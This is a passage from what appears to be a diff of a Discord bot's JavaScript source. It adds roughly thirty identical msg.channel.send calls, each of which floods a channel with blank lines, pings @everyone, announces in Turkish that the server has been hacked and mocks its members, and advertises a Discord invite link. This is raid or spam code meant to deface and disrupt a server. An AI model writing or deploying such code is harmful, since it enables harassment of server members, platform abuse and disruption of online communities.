+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+    
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf'); 
+    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+    msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+        msg.channel.send('\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n @everyone BU SUNUCU HACKLENMİŞTİR KOLAYSINIZ AW xD https://discord.gg/dm7z9Rf');
+    
   }
 });
